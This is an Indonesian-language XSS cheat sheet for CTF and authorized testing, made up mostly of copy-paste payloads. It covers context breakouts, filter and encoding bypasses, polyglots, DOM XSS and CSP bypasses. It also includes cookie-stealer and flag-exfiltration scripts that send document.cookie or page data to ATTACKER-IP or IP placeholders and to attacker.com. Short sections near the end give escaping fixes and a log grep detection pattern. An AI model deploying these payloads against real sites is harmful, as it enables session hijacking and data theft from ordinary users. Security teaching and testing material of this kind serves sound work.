# XSS (Cross-Site Scripting) Cheat Sheet

> **Tipe:** Reflected | Stored | DOM-based  
> **Goal CTF:** Curi cookie/session, trigger action admin, atau baca flag via JS

---

## Kapan Dipakai

- Input ditampilkan kembali tanpa encoding (search, comment, profile, error message)
- Parameter URL masuk ke HTML/JS (`?name=`, `?q=`, `?redirect=`)
- Stored: comment, username, bio, message board

**Cek cepat:**
```
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## 1. Context — Tentukan Dulu Konteksnya

| Context | Contoh di HTML | Payload approach |
|---------|----------------|------------------|
| **HTML body** | `<div>INPUT</div>` | `<script>`, `<img onerror>` |
| **Attribute** | `<input value="INPUT">` | `" onfocus=alert(1) autofocus "` |
| **Inside script** | `var x = 'INPUT';` | `'; alert(1);//` |
| **URL/href** | `<a href="INPUT">` | `javascript:alert(1)` |
| **CSS** | `style="INPUT"` | `expression(alert(1))` (IE lama) |

---

## 2. Basic Payloads

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>

<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

---

## 3. Cookie Stealer (CTF Classic)

```html
<script>fetch('http://ATTACKER-IP/?c='+document.cookie)</script>

<img src=x onerror="this.src='http://ATTACKER-IP/?c='+document.cookie">

<script>new Image().src='http://ATTACKER-IP/?c='+document.cookie</script>

<script>
location='http://ATTACKER-IP/?c='+encodeURIComponent(document.cookie)
</script>
```

**Ganti `ATTACKER-IP` dengan IP kamu / webhook (webhook.site, requestbin).**

---

## 4. Attribute Context Breakout

```html
" onmouseover="alert(1)
" autofocus onfocus=alert(1) x="
' onmouseover='alert(1)
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
```

**Contoh:**
```html
<!-- Input: " onfocus=alert(1) autofocus " -->
<input value="" onfocus=alert(1) autofocus "">
```

---

## 5. JavaScript Context Breakout

```javascript
'; alert(1);//
"; alert(1);//
</script><script>alert(1)</script>
\'; alert(1);//
${alert(1)}
```

**Contoh:**
```html
<!-- Input: '; alert(1);// -->
<script>var name = ''; alert(1);//';</script>
```

---

## 6. Filter Bypass

### Case Variation
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

### Without `<script>`
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onpageshow=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

### Without Spaces
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<a/href=javascript:alert(1)>click
```

### Without Parentheses (filter `()`)
```html
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<img src=x onerror=alert;throw 1>
<svg/onload=alert;throw 1>
```

### Without `alert`
```html
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>print()</script>
<script>eval('al'+'ert(1)')</script>
<script>window['alert'](1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
```

### Encoding Bypass

```html
<!-- HTML entity -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- URL encode -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode -->
<script>\u0061lert(1)</script>

<!-- Hex -->
<img src=x onerror=\x61lert(1)>
```

### Tag Breaking
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<<script>script>alert(1)<</script>/script>
```

### Null Byte (legacy)
```
<scr%00ipt>alert(1)</script>
```

---

## 7. Polyglot Payloads (Multi-context)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=confirm(1)>
```

---

## 8. DOM XSS

**Cari di source JS:**
```javascript
document.write(location.hash)
innerHTML = param
eval(userInput)
location = urlParam
```

**Payload via hash:**
```
http://target.com/page#<img src=x onerror=alert(1)>
```

**Payload via parameter:**
```
http://target.com/page?default=<script>alert(1)</script>
```

**Common sinks:**
- `document.write()`, `document.writeln()`
- `innerHTML`, `outerHTML`
- `eval()`, `setTimeout()`, `setInterval()` dengan user input
- `location`, `location.href`, `location.assign()`
- `jQuery.html()`, `$().append()`

---

## 9. XSS via Event Handlers (Lengkap)

```html
onload  onerror  onclick  onmouseover  onfocus  onblur
onchange  onsubmit  onkeydown  onkeyup  onkeypress
onmouseenter  onmouseleave  ondblclick  oncontextmenu
oninput  onscroll  onwheel  oncopy  oncut  onpaste
onanimationstart  ontransitionend  ontoggle  onpageshow
```

**Minimal yang sering work:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 10. CSP Bypass (Advanced)

Kalau ada Content-Security-Policy:

```html
<!-- Cek header CSP di response -->
<!-- base-uri restriction? -->
<base href="http://attacker.com/">

<!-- jsonp endpoint allowed? -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- AngularJS (legacy) -->
{{constructor.constructor('alert(1)')()}}
```

---

## 11. CTF — Baca Flag via XSS

```html
<!-- Flag di DOM -->
<script>alert(document.body.innerHTML)</script>
<script>fetch('/flag').then(r=>r.text()).then(d=>fetch('http://IP/?f='+d))</script>

<!-- Flag di cookie -->
<script>fetch('http://IP/?c='+document.cookie)</script>

<!-- Exfil via img (no CORS issue) -->
<script>
fetch('/api/flag').then(r=>r.text()).then(f=>{
  new Image().src='http://IP/?flag='+encodeURIComponent(f)
})
</script>
```

---

## 12. Patch Cepat (Defense)

### PHP
```php
// Saat output ke HTML
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// Atau
echo htmlentities($input, ENT_QUOTES, 'UTF-8');
```

### Python Flask/Jinja2
```python
# Auto-escape default di {{ var }}
# JANGAN pakai |safe kecuali yakin
from markupsafe import escape
return escape(user_input)
```

### Node.js
```javascript
const escapeHtml = (s) => s.replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
```

### Header Defense
```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

---

## 13. Payload Quick List (Copy-Paste)

```
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) "
javascript:alert(1)
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<script>fetch('http://IP/?c='+document.cookie)</script>
</script><script>alert(1)</script>
';alert(1)//
```

---

## 14. Deteksi di Log

```bash
tail -f /var/log/apache2/access.log | grep -iE "(script|onerror|onload|javascript:|alert\(|document\.cookie|<svg|<iframe)"
```

---

*Untuk authorized security testing & CTF only.*
